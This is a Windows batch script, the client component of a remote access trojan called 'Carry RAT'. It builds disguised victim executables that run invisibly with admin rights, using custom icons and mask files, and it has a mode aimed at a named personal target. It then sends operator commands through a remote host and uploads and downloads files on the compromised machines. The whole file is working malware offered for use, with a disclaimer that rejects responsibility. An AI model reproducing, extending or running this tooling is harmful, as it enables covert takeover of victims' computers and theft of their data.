@echo off
:: Carry RAT . The RAT written in batch-python language
::   Copyright (C) 2017  ,Abdul Hakim
:: 
::   This program is free software: you can redistribute it and/or modify
::   it under the terms of the GNU General Public License as published by
::   the Free Software Foundation, either version 3 of the License, or
::   (at your option) any later version.
::
::   This program is distributed in the hope that it will be useful,
::   but WITHOUT ANY WARRANTY; without even the implied warranty of
::   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
::   GNU General Public License for more details.
::   You should have received a copy of the GNU General Public License
::   along with this program.  If not, see <http://www.gnu.org/licenses/>.

:: Carry Setting
set version=0.1
color 0f
set typever=Alpha
set datebuilt=Mac 21 2017
set author=Abdul Hakim
set aim=have fully customizable R.A.T tool.^&echo.Author will not responsible for any action happen to user.
set laststatus=Carry - Last Command : 
for /F %%a in ('ping -n 1 google.com ^| findstr /i "request could not find"') do (
	if "%%a"=="" set netstatus=available
	if not "%%a"=="" set netstatus=not available
	)
set wintype=64
if exist "C:\windows\system32" set wintype=32
::

title Carry Client - v(%version%)
del /F /Q cmdreserr.txt 2>nul >nul
del /F /Q cmdresok.txt 2>nul >nul
del /F /Q cmdin.txt 2>nul >nul
set currentpath=%cd%

:logo
call logosetting.bat
echo.(Carry Client %version% %typever%)[release date : %datebuilt%],(Internet = %netstatus%),Win(%wintype%)
echo.
:carrymenu
set /p "carryclient=Carry> "
::user option
if "%carryclient:~0,7%"=="connect" goto login
if "%carryclient:~0,3%"=="cnt" goto login
if "%carryclient:~0,5%"=="lsusr" call :lsusr &goto :carrymenu
if "%carryclient:~0,3%"=="lsr" call :lsusr &goto :carrymenu
if "%carryclient:~0,5%"=="about" msg * "Carry Client v(%version%) - %typever%,Author : %author% ,this tool was built to %aim% & goto carrymenu
if "%carryclient:~0,3%"=="abt" msg * "Carry Client v(%version%) - %typever%,Author : %author% ,this tool was built to %aim% & goto carrymenu
if "%carryclient:~0,7%"=="title " title Carry : %carryclient:~6,7000%&goto carrymenu
if "%carryclient:~0,4%"=="ttl " title Carry : %carryclient:~6,7000%&goto carrymenu
:: item option
if "%carryclient:~0,8%"=="lspkg" call :lspkg
if "%carryclient:~0,3%"=="lpg" call :lspkg
if "%carryclient:~0,5%"=="build" goto build
if "%carryclient:~0,3%"=="bld" goto build
title %laststatus% %carryclient%
call %carryclient%
goto carrymenu



:lspkg
echo.--------Packages Installed-------
echo.
dir /b "%cd%\packages"
echo.--         --
if "%carriername-user-session%"=="" goto :carrymenu
if not "%carriername-user-session%"=="" goto :Eof


:build
title Carry - Build Carrier
echo.Build Carrier
set /p "carriername=Carrier Name > "
title Carry - Build Carrier (%carriername%)
echo.
:carriertype
echo. Carrier target type :
echo.-------------------------------------
echo. 1. Intelligent mode - designed for public target
echo. 2. Detective Mode - designed for personal target.
echo.-------------------------------------
echo.
set /p "autoortarget=1,2 > "
if "%autoortarget:~0,1%"=="1" (
	set targetname=CARRY:INTELLIMODE[ID]
	echo.Target mode selected [INTELLIMODE]
	)
if "%autoortarget:~0,1%"=="2" (
	set /p "targetname=Target Name >"
	echo.Target mode selected [DETECTIVE MODE]
	)
if "%autoortarget:~0,1%" gtr "2" goto carriertype
if "%autoortarget:~0,1%"=="" echo.Target mode selected [INTELLIMODE] & set targetname=CARRY:INTELLIMODE[ID]
set /p "description=App About >"
title Carry - Build Carrier (%carriername%),(%targetname%)
set /p "icon=Icon File >"
set /p "mask=Mask File >"
set /p "put=Upload to web ? [y,n] >"
echo.%mask%>"%cd%\applaunch.dat"
echo.%targetname%>"%cd%\targetname.txt"

if not "%icon%"=="" set icon=-icon %icon% 
if not "%mask%"=="" set mask=-include %icon%

call b2e.exe -bat "%cd%\server\server.bat" -save "%cd%\builded\%carriername%.exe" -admin -overwrite -invisible -temp -description "%description%" -include "%cd%\server\" -include "%cd%\Modc\modprog\" -include host.txt -include "%cd%\targetname.txt" -include "%cd%\applaunch.dat" %icon%%mask%
if exist "%cd%\builded\%carriername%.exe" echo.Sucessfully Builded !&title %status% Build - Success
if not exist "%cd%\builded\%carriername%.exe" echo.Unsucessfully Builded ! &title %status% Build - Unsuccessfullygoto carrymenu

if /i "%put:~0,1%"=="y" (
	call client-carrier.exe -uproot "%cd%\builded\%carriername%"
)
del /F /Q "%cd%\applaunch.dat" 2>nul >nul
del /F /Q "%cd%\targetname.txt" 2>nul >nul
goto carrymenu

:getparam
for /F "tokens=2 delims= " %%a in ('echo.%*') do set modcommand=%%a
for /F "tokens=3,4* delims= " %%a in ('echo.%*') do (
	set modparameter=%%a %%b %%c
	)
goto :Eof
:: user session

:mod
call :getparam %carrycommand%
echo.%modcommand%
echo.Executing ModCmd - Modifiable Command (%modcommand%)
echo.Parameter : (%modparameter%)
if exist "%cd%\ModC\%modcommand%" (
	call "%cd%\modc\%modcommand%\init.bat" %modparameter%
	goto modcleaner
	)
if not exist "%cd%\ModC\%command%" echo.Mod not exist !.Please try other command
goto session

:lsusr
echo.>%temp%\lsdircarry.tmp
for /f "delims=: tokens=2" %%a in ('call client-carrier.exe -lsdir /') do echo.%%a>>%temp%\lsdircarry.tmp
echo.----User Available !----
for /f "tokens=2* delims= " %%a in (%temp%\lsdircarry.tmp) do echo. %%a %%b
echo.-----------------------
goto :Eof

:login
title %status% login screen
for /f "tokens=1 delims=;" %%a in ('type "%cd%\host.txt"') do set hostname=%%a
for /f "tokens=2 delims=;" %%a in ('type "%cd%\host.txt"') do set hostuser=%%a
for /f "tokens=3 delims=;" %%a in ('type "%cd%\host.txt"') do set userpwd=%%a
if "%hostname%"=="" echo.Data not filled correctly !&goto carrymenu
title Carry - (%hostname%)
if not "%carryclient:~8,7000%"=="" set carriername-user-session=%carryclient:~8,7000%&goto nextlogin
set /p "carriername-user-session=carrier name> "
:nextlogin
call client-carrier.exe -userexist %carriername-user-session% >"%temp%\userexist.tmp"
set /p userexist=<"%temp%\userexist.tmp"
if "%userexist%"=="User Exist !" goto newsession
if not "%userexist%"=="User Exist !" (
	echo.User not Exist !. Please Choose Correct carrier !
	goto carrymenu
	)

:newsession
title Carry@[%carriername-user-session%] ,Last Command : NEWSESSION-CARRY
echo.NEWSESSION-CARRY>cmdin.txt
call client-carrier.exe -upload cmdin.txt cmdin.txt %carriername-user-session%
call client-carrier.exe -download cmdresok.txt %carriername-user-session%
type cmdresok.txt | findstr ">" >"%temp%\newsession.txt"&set /p promptname=<"%temp%\newsession.txt"
type cmdresok.txt | findstr /v ">"
del /F /Q cmdresok.txt 2>nul >nul
del /F /Q cmdin.txt 2>nul >nul

set carry-prompt_color=False
set lastcarrycolor=0a
:session
set carrycommand=
set /p "carrycommand=%promptname%"

set carrycommand=%carrycommand:"=''%
if "%carrycommand%"=="" goto session
if "%carrycommand:~0,3%"=="cls" cls&title Carry@[%carriername-user-session%],Command : No Command&goto session
if "%carrycommand:~0,7%"=="prompt " set promptname=%carrycommand:~7,7000%& title Carry@[%carriername-user-session%] ,Last Command : %carrycommand:''="%&goto session
if "%carrycommand:~0,4%"=="exit" echo.----- Carry [ client ] connection closed.&echo.server still running. &echo.to stop server type "end-svr" when logged in -----& title Carry@[%carriername-user-session%] ,Last Command : %carrycommand:''="%&set "carriername-user-session=" &goto carrymenu
if "%carrycommand:~0,8%"=="end-svr" set "carrycommand=exit /b"
if "%carrycommand:~0,5%"=="lsusr" call :lsusr & goto :session
if "%carrycommand:~0,6%"=="title " title Carry@[%carriername-user-session%] ,Last Command : %carrycommand:''="%&goto session
if "%carrycommand:~0,6%"=="color " color %carrycommand:~6,7000% & title Carry@[%carriername-user-session%] ,Last Command : %carrycommand:''="%&goto session

if "%carrycommand:~0,4%"=="mod " goto mod

if "%carrycommand:~0,7%"=="refresh" (
	call client-carrier.exe -delete cmdresok.txt %carriername-user-session%
	call client-carrier.exe -delete cmdreserr.txt %carriername-user-session%
	echo.Sucessfully Cleaned ! [ %time:~0,5% ]
	goto session
	)
if "%carrycommand:~0,5%"=="inpkg" (
	if exist "%cd%\packages\%carrycommand:~6,7000%" (
		echo.Installing [ "%carrycommand:~6,7000%" ] . . . .
		call client-carrier.exe -upload "%cd%\packages\%carrycommand:~6,7000%" "%carrycommand:~6,7000%" %carriername-user-session%
		echo.%carrycommand%>cmdin.txt
		call client-carrier.exe -upload cmdin.txt cmdin.txt %carriername-user-session%
		call client-carrier.exe -download cmdresok.txt %carriername-user-session%
		type cmdresok.txt
		goto :session
		)
	if not exist "%cd%\packages\%carrycommand:~6,7000%" echo.Package to install [%carrycommand:~6,7000%] not exist !&goto session
	)

if "%carrycommand:~0,7%"=="inmodpg" (
	if exist "%cd%\modc\modprog\%carrycommand:~8,7000%" (
		echo.Installing [ "%carrycommand:~8,7000%" ] . . . .
		call client-carrier.exe -upload "%cd%\modc\modprog\%carrycommand:~8,7000%" "%carrycommand:~8,7000%" %carriername-user-session%
		echo.%carrycommand%>cmdin.txt
		call client-carrier.exe -upload cmdin.txt cmdin.txt %carriername-user-session%
		call client-carrier.exe -download cmdresok.txt %carriername-user-session%
		type cmdresok.txt
		goto :session
		)
	if not exist "%cd%\modc\modprog\%carrycommand:~8,7000%" echo.Package to install [%carrycommand:~8,7000%] not exist !&goto session
	)
if "%carrycommand:~0,7%"=="promptc" (
	set carry-prompt_color=true
	set carrycolor=%carrycommand:~9,7000%
	set carrycolor=%carrycolor:red=0c%
	set carrycolor=%carrycolor:blue=0b%
	set carrycolor=%carrycolor:green=0a%
	set carrycolor=%carrycolor:yellow=0e%
	set carrycolor=%carrycolor:white=0f%
	set carrycolor=%carrycolor:gray=08%
	set carrycolor=%carrycolor:nc=00%
	set carrycolor=%carrycolor:ncb=00%
	set carrycolor=%carrycolor:ncw=77%
	set carrycolor=%carrycolor:nclw=ff%
	goto session
	)
if "%carrycommand:~0,5%"=="gitem" (
	title Carry@[%carriername-user-session%] ,Last Command : %carrycommand:''="%
	call client-carrier.exe -upload cmdin.txt cmdin.txt %carriername-user-session%
	call client-carrier.exe -download carrygitem.txt %carriername-user-session%
	for /f %%a in ('type carrygitem.txt') do set carrygitem=%%a
	call client-carrier.exe -download %carrygitem% %carriername-user-session%
	goto :session
	)
if "%carrycommand:~0,5%"=="iitem" (
	title Carry@[%carriername-user-session%] ,Last Command : %carrycommand:''="%
	if exist "%carrycommand:~6,7000%" (
		echo.Installing [ %carrycommand:~6,7000% ] . . . .
		del /F /Q "%temp%\carryupload\*.*" 2>nul >nul
		mkdir "%temp%\carryupload" 2>nul >nul
		copy %carrycommand:~6,7000% "%temp%\carryupload" 2>nul >nul
		for /f %%a in ('dir /b "%temp%\carryupload\"') do set carryupload=%%a
		timeout /t 1 >Nul
		call client-carrier.exe -upload "%temp%\carryupload\%carryupload%" "%carryupload%" "%carriername-user-session%"
		del /F /Q "%temp%\carryupload\*.*" 2>nul >nul
		
		echo.iitem "%carryupload%">cmdin.txt
		call client-carrier.exe -upload cmdin.txt cmdin.txt %carriername-user-session%
		call client-carrier.exe -download cmdresok.txt %carriername-user-session%
		type cmdresok.txt
		goto :session
		)
	if not exist "%carrycommand:~6,7000%" echo.Item to install [%carrycommand:~6,7000%] not exist !&goto session
	)
	
if "%carrycommand:~0,5%"=="lspkg" (
	title Carry@[%carriername-user-session%] ,Last Command : %carrycommand:''="%
	call :lspkg
	)

if "%carrycommand:~0,2%"=="cd" (
	title Carry@[%carriername-user-session%] ,Last Command : %carrycommand:''="%
	echo.%carrycommand:''="% >cmdin.txt
	call client-carrier.exe -upload cmdin.txt %carriername-user-session%
	call client-carrier.exe -download cmdresok.txt %carriername-user-session%
	call client-carrier.exe -download cmdreserr.txt %carriername-user-session%
	set /p cdexist=<"%currentpath%\cmdreserr.txt"
	if "%carrycommand:~3,7000%"=="" type cmdresok.txt&type cmdreserr.txt&goto :session
	if not "%cdexist%"=="The system cannot find the drive specified." (
		set promptname=%carrycommand:~3,7000%
		)
	if "%cdexist%"=="The system cannot find the drive specified." (
		echo.The system cannot find the drive specified.
		)

)
title Carry@[%carriername-user-session%] ,Last Command : %carrycommand:''="%
echo.%carrycommand:''="% >cmdin.txt
call client-carrier.exe -upload cmdin.txt cmdin.txt %carriername-user-session%
call client-carrier.exe -download cmdresok.txt %carriername-user-session%
call client-carrier.exe -download cmdreserr.txt %carriername-user-session%
::
type cmdreserr.txt&del /F /Q cmdreserr.txt 2>nul >nul
type cmdresok.txt&del /F /Q cmdresok.txt 2>nul >nul
del /F /Q cmdin.txt 2>nul >nul
set carrycommand=
goto session

:modcleaner
del /F /Q cmdin.txt 2>nul >nul
del /F /Q cmdreserr.txt 2>nul >nul
del /F /Q cmdresok.txt 2>nul >nul
goto session